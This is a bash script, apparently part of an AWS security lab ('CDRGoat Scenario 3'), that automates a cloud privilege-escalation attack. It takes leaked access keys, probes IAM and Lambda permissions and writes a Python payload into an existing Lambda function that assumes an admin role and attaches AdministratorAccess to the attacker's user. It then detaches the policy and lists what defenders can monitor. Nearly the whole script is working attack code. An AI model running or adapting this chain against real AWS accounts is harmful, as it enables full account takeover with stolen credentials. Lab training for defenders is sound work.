#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  else
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  fi
}

is_valid_keys() {
  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
  local rc=0 out

  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
  PROFILE="streamgoat-scenario-3"

  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
  aws configure set region                "$region" --profile "$PROFILE"

  spin_start "Validating credentials via STS"
  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
  spin_stop

  if [ "$rc" -ne 0 ]; then
    return 1
  fi

  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"
  return 0
}

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 3               ===" "${RESET}"
  printf "%sLeaked Keys → IAM Enumeration → Lambda Code Injection → Privilege Escalation%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  • Step 1. Configure leaked AWS credentials\n"
  printf "  • Step 2. Enumerate permissions for leaked credentials\n"
  printf "  • Step 3. Enumerate custom IAM roles\n"
  printf "  • Step 4. Enumerate Lambda functions and execution roles\n"
  printf "  • Step 5. Review findings and plan attack vector\n"
  printf "  • Step 6. Execute privilege escalation via Lambda code injection\n"
  printf "  • Step 7. Cleanup — detach elevated policy\n"
}
banner

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in aws jq zip; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true

#############################################
# Step 1. Configuring AWS credentials
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring AWS credentials  ===" "${RESET}"

step "Starting point configuration"
while :; do
  read -r -p "Enter leaked AWS key: " AWSKEY_USER
  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
    break
  else
    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
  fi
done

printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We configured AWS CLI with leaked IAM user credentials.\n\n"
printf "Credentials may leak from various sources:\n"
printf "  • Hardcoded in source code repositories\n"
printf "  • Exposed in CI/CD logs or container images\n"
printf "  • Leaked via misconfigured S3 buckets\n\n"
printf "STS GetCallerIdentity confirms the credentials are valid.\n\n"
read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 2. Permission enumeration for leaked credentials
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"

step "Identifying stolen identity"
spin_start "Calling STS GetCallerIdentity"
CALLER_ID="$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>/dev/null)"
spin_stop

if [ -n "$CALLER_ID" ]; then
  ok "Identity confirmed"
  printf "  • Account : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.Account')" "$RESET"
  printf "  • ARN     : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.Arn')" "$RESET"
  printf "  • UserId  : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.UserId')" "$RESET"
fi

IAM_USER_NAME="$(echo "$CALLER_ID" | jq -r '.Arn' | awk -F/ '{print $NF}')"

step "Probing permissions across AWS services"
try "IAM List Roles"        aws iam list-roles --profile "$PROFILE"
try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances" aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"          aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"        aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"

step "Checking managed policies attached to user: $IAM_USER_NAME"

user_managed_policies=$(aws iam list-attached-user-policies --user-name "$IAM_USER_NAME" --profile "$PROFILE" \
  --output json | jq -r '.AttachedPolicies[].PolicyArn')

if [ -z "$user_managed_policies" ]; then
  info "No managed policies attached to user: $IAM_USER_NAME"
else
  for policy_arn in $user_managed_policies; do
    policy_name=$(basename "$policy_arn")
    printf "${BOLD}${YELLOW}Managed Policy: %s${RESET}\n" "$policy_name"

    version_id=$(aws iam get-policy --policy-arn "$policy_arn" --profile "$PROFILE" \
      --output json | jq -r '.Policy.DefaultVersionId')

    doc=$(aws iam get-policy-version --profile "$PROFILE" \
      --policy-arn "$policy_arn" \
      --version-id "$version_id" \
      --output json | jq -r '.PolicyVersion.Document')

    echo "$doc" | jq -c '.Statement[]' | while read -r stmt; do
      sid=$(echo "$stmt" | jq -r '.Sid // "None"')
      effect=$(echo "$stmt" | jq -r '.Effect')
      action=$(echo "$stmt" | jq -c '.Action')
      resource=$(echo "$stmt" | jq -c '.Resource')
      printf "    Sid:      %s\n    Effect:   %s\n    Action:   %s\n    Resource: %s\n\n" "$sid" "$effect" "$action" "$resource"
    done
  done
fi

printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We enumerated permissions for the leaked credentials.\n\n"
printf "Key findings:\n"
printf "  • ${MAGENTA}iam:List*/Get*${RESET}: Can enumerate IAM roles and policies\n"
printf "  • ${MAGENTA}lambda:*${RESET}: Full Lambda access (except CreateFunction)\n\n"
printf "Even without CreateFunction, we can modify existing Lambda code\n"
printf "using ${CYAN}UpdateFunctionCode${RESET} and invoke functions.\n\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Enumerating custom roles
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Enumerating StreamGoat-aws3-Role-* roles  ===" "${RESET}"
printf "We noticed that IAM List Roles succeeded. Let's dig inside.\n"

step "Enumerating IAM roles starting with 'StreamGoat-aws3-Role'"

roles=$(aws iam list-roles --profile "$PROFILE" --output json | jq -r '.Roles[] | select(.RoleName | startswith("StreamGoat-aws3-Role")) | .RoleName')

if [ -z "$roles" ]; then
  err "No roles starting with 'StreamGoat-aws3-Role' found"
else
  ok "Found roles:"
  echo "$roles"
fi

for role in $roles; do
  echo
  printf "${BOLD}${MAGENTA}Role: %s${RESET}\n" "$role"

  attached_policies=$(aws iam list-attached-role-policies --profile "$PROFILE" --role-name "$role" --output json | jq -r '.AttachedPolicies[].PolicyArn')

  for policy_arn in $attached_policies; do
    policy_name=$(basename "$policy_arn")
    printf "  ${YELLOW}Managed Policy: %s${RESET}\n" "$policy_name"

    version_id=$(aws iam get-policy --profile "$PROFILE" --policy-arn "$policy_arn" --output json | jq -r '.Policy.DefaultVersionId')
    doc=$(aws iam get-policy-version --profile "$PROFILE" --policy-arn "$policy_arn" --version-id "$version_id" --output json | jq -r '.PolicyVersion.Document')

    echo "$doc" | jq -c '.Statement[]' | while read -r stmt; do
      sid=$(echo "$stmt" | jq -r '.Sid // "None"')
      effect=$(echo "$stmt" | jq -r '.Effect')
      action=$(echo "$stmt" | jq -c '.Action')
      resource=$(echo "$stmt" | jq -c '.Resource')
      printf "    Sid:      %s\n    Effect:   %s\n    Action:   %s\n    Resource: %s\n" "$sid" "$effect" "$action" "$resource"
    done
  done
done

printf "\n"
STREAMGOAT_ROLE_NAME=$(echo "$roles" | grep -i "\-admin\-" | head -1)

read -r -p "The custom role ${YELLOW}${STREAMGOAT_ROLE_NAME}${RESET} looks interesting. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

step "Capturing ${STREAMGOAT_ROLE_NAME} ARN"

STREAMGOAT_ROLE_ARN=$(aws iam get-role --profile "$PROFILE" --role-name "$STREAMGOAT_ROLE_NAME" \
  --output json | jq -r '.Role.Arn')

if [ -n "$STREAMGOAT_ROLE_ARN" ]; then
  ok "Captured ARN: $YELLOW$STREAMGOAT_ROLE_ARN$RESET"
else
  err "Could not retrieve ARN for $STREAMGOAT_ROLE_NAME"
  exit 1
fi
printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We enumerated IAM roles and discovered:\n\n"
printf "  • ${MAGENTA}%s${RESET}: Has AdministratorAccess attached!\n\n" "$STREAMGOAT_ROLE_NAME"
printf "If we can assume this role or use it via Lambda, we achieve\n"
printf "full account compromise.\n\n"
read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Enumerating Lambda functions
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Enumerating StreamGoat-aws3 Lambda functions  ===" "${RESET}"

step "Fetching Lambda functions with names starting with 'StreamGoat-aws3'"
lambda_functions=$(aws lambda list-functions --profile "$PROFILE" --output json | jq -r '.Functions[] | select(.FunctionName | startswith("StreamGoat-aws3")) | @base64')

if [ -z "$lambda_functions" ]; then
  err "No Lambda functions with prefix 'StreamGoat-aws3' found"
  exit 0
fi

for encoded in $lambda_functions; do
  _jq() { echo "$encoded" | base64 --decode | jq -r "$1"; }

  LAMBDA_NAME=$(_jq '.FunctionName')
  ROLE_ARN=$(_jq '.Role')
  ROLE_NAME=$(basename "$ROLE_ARN")

  printf "\n${BOLD}${MAGENTA}Lambda Function: %s${RESET}\n" "$LAMBDA_NAME"
  printf "  Execution Role: %s\n" "$ROLE_NAME"
  printf "  Role ARN:       %s\n" "$ROLE_ARN"

  attached_policies=$(aws iam list-attached-role-policies --profile "$PROFILE" --role-name "$ROLE_NAME" --output json | jq -r '.AttachedPolicies[].PolicyArn')

  for policy_arn in $attached_policies; do
    policy_name=$(basename "$policy_arn")
    printf "  ${YELLOW}Managed Policy: %s${RESET}\n" "$policy_name"

    version_id=$(aws iam get-policy --profile "$PROFILE" --policy-arn "$policy_arn" --output json | jq -r '.Policy.DefaultVersionId')
    doc=$(aws iam get-policy-version --profile "$PROFILE" --policy-arn "$policy_arn" --version-id "$version_id" --output json | jq -r '.PolicyVersion.Document')

    echo "$doc" | jq -c '.Statement[]' | while read -r stmt; do
      sid=$(echo "$stmt" | jq -r '.Sid // "None"')
      effect=$(echo "$stmt" | jq -r '.Effect')
      action=$(echo "$stmt" | jq -c '.Action')
      resource=$(echo "$stmt" | jq -c '.Resource')
      printf "    Sid:      %s\n    Effect:   %s\n    Action:   %s\n    Resource: %s\n\n" "$sid" "$effect" "$action" "$resource"
    done
  done
done

TARGET_LAMBDA=$(aws lambda list-functions --profile "$PROFILE" --output json | jq -r '.Functions[] | select(.FunctionName | startswith("StreamGoat-aws3")) | select(.FunctionName | contains("Lambda_2")) | .FunctionName')

printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We discovered %s with ${MAGENTA}sts:AssumeRole${RESET} permission.\n\n" "$TARGET_LAMBDA"
printf "This allows the Lambda to assume other roles, including\n"
printf "%s. If we modify the Lambda code, we can:\n" "$STREAMGOAT_ROLE_NAME"
printf "  • Assume the admin role\n"
printf "  • Grant our user permanent admin access\n\n"
read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 5. Reviewing all collected information
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Reviewing all collected information  ===" "${RESET}"
printf "\n"
printf "In Step 2, we saw that our user has ${YELLOW}lambda:*${RESET} permissions, but with a specific deny for ${YELLOW}lambda:CreateFunction${RESET}.\n"
printf "In Step 4, we identified ${MAGENTA}%s${RESET} which has a policy allowing ${YELLOW}sts:AssumeRole${RESET}.\n" "$TARGET_LAMBDA"
printf "And we found ${CYAN}%s${RESET} role with full administrator privileges.\n\n" "$STREAMGOAT_ROLE_NAME"
printf "Planned attack vector through modification of ${MAGENTA}%s${RESET}:\n" "$TARGET_LAMBDA"
printf "  1. Update Lambda code via ${YELLOW}UpdateFunctionCode${RESET}\n"
printf "  2. Lambda assumes ${CYAN}%s${RESET}\n" "$STREAMGOAT_ROLE_NAME"
printf "  3. Attach ${YELLOW}AdministratorAccess${RESET} to ${YELLOW}%s${RESET}\n\n" "$IAM_USER_NAME"


#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We synthesized our findings into an attack plan:\n\n"
printf "  1. Our user has ${MAGENTA}lambda:UpdateFunctionCode${RESET}\n"
printf "  2. Lambda_2 has ${MAGENTA}sts:AssumeRole${RESET}\n"
printf "  3. %s has ${MAGENTA}AdministratorAccess${RESET}\n\n" "$STREAMGOAT_ROLE_NAME"
printf "Attack: Modify Lambda to AssumeRole admin and grant us admin access.\n\n"
read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 6. Executing privilege escalation via Lambda
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Executing privilege escalation via Lambda  ===" "${RESET}"

step "Preparing malicious Lambda payload"

ESCALATION_ROLE_ARN="$STREAMGOAT_ROLE_ARN"
ATTACKER_USER="$IAM_USER_NAME"

TMPDIR="/tmp/lambda-escalation"
rm -rf "$TMPDIR"
mkdir -p "$TMPDIR"

cat > "$TMPDIR/index.py" <<EOF
import boto3
def handler(event, context):
    sts = boto3.client("sts")
    resp = sts.assume_role(
        RoleArn="${ESCALATION_ROLE_ARN}",
        RoleSessionName="exploit-escalation"
    )

    creds = resp["Credentials"]
    iam = boto3.client(
        "iam",
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"]
    )

    iam.attach_user_policy(
        UserName="${ATTACKER_USER}",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )

    return "Exploit attempted"
EOF

(cd "$TMPDIR" && zip function.zip index.py >/dev/null)

spin_start "Updating Lambda function code (waiting for deployment)"
aws lambda update-function-code \
  --function-name "$TARGET_LAMBDA" --profile "$PROFILE" \
  --zip-file "fileb://$TMPDIR/function.zip" \
  --publish >/dev/null

for i in $(seq 1 60); do
  STATUS=$(aws lambda get-function --function-name "$TARGET_LAMBDA" --profile "$PROFILE" \
    --query 'Configuration.LastUpdateStatus' --output text 2>/dev/null || echo "InProgress")
  [ "$STATUS" = "Successful" ] && break
  sleep 1
done
spin_stop
ok "Lambda code updated"

step "Triggering Lambda for privilege escalation"
aws lambda invoke --profile "$PROFILE" --function-name "$TARGET_LAMBDA" "$TMPDIR/lambda_output.json" >/dev/null
ok "Lambda invoked. Output:"
cat "$TMPDIR/lambda_output.json"
printf "\n"

step "Verifying if admin privileges were assigned to user"

admin_attached=$(aws iam list-attached-user-policies --profile "$PROFILE" --user-name "$ATTACKER_USER" \
  --output json | jq -r '.AttachedPolicies[] | select(.PolicyName=="AdministratorAccess") | .PolicyName')

if [ "$admin_attached" == "AdministratorAccess" ]; then
  ok "User $ATTACKER_USER is now Admin!"
  printf "\nRepeating a few permission enumeration attempts from Step 2:\n"
  spin_start "Waiting for IAM policy propagation"
  sleep 10
  spin_stop
  try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
  try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
  try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
else
  err "Privilege escalation failed or not applied yet."
fi
printf "\n"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We executed the privilege escalation attack:\n\n"
printf "  1. Updated Lambda code via ${MAGENTA}UpdateFunctionCode${RESET}\n"
printf "  2. Lambda assumed admin role and attached AdministratorAccess to our user\n"
printf "  3. Verified with permission re-enumeration — all [OK]!\n\n"
printf "%s now has full admin privileges.\n\n" "$ATTACKER_USER"
read -r -p "Step 6 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 7. Cleanup — Detach elevated policy
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Cleanup — detach AdministratorAccess from user  ===" "${RESET}"

POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"

rm -rf "$TMPDIR"

aws iam detach-user-policy \
  --user-name "$ATTACKER_USER" --profile "$PROFILE" \
  --policy-arn "$POLICY_ARN" && ok "Detached AdministratorAccess from $ATTACKER_USER"

attached=$(aws iam list-attached-user-policies \
  --user-name "$ATTACKER_USER" --profile "$PROFILE" \
  --output json | jq -r '.AttachedPolicies[]?.PolicyArn')

if echo "$attached" | grep -q "$POLICY_ARN"; then
  err "Policy still attached — cleanup failed"
else
  ok "Cleanup verified — no elevated policy remains"
fi

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Validated leaked IAM user credentials\n"
printf "  2. Enumerated permissions (lambda:*, iam:List*/Get*)\n"
printf "  3. Discovered %s with AdministratorAccess\n" "$STREAMGOAT_ROLE_NAME"
printf "  4. Found %s with sts:AssumeRole permission\n" "$TARGET_LAMBDA"
printf "  5. Modified Lambda code via UpdateFunctionCode\n"
printf "  6. Lambda assumed admin role and attached AdministratorAccess to user\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Full AWS account administrator access\n"
printf "  • Lambda code injection for privilege escalation\n"
printf "  • Role chaining via sts:AssumeRole\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • Lambda code updates (UpdateFunctionCode events)\n"
printf "  • AssumeRole calls to privileged roles\n"
printf "  • AttachUserPolicy/AttachRolePolicy to admin policies\n"
printf "  • Credential usage from unexpected locations\n\n"

read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true
